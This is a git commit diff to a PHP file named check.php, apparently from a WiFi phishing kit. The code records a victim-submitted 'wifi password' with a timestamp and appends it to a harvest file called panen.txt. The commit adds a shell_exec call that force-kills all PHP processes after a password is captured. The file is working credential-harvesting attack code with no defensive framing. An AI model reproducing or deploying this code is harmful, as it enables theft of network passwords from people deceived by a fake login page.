7d307f83be53b4de440e20c6dfc6f1f63ba064f4
WALDIANO <100467466+waldiano@users.noreply.github.com>
2022-10-29 18:30:53 +0700

    Update check.php

--- simple/check.php
+++ simple/check.php
@@ -5,7 +5,8 @@ date_default_timezone_set("Asia/Jakarta");
 	$key1 = "wifi password: ".$_POST['key1']."\n";
     $credential = $date.$key1."\n";
     file_put_contents('panen.txt', $credential, FILE_APPEND);
-	
+    
+	shell_exec('pkill -9 php');
 ?>
 
 <!DOCTYPE html>
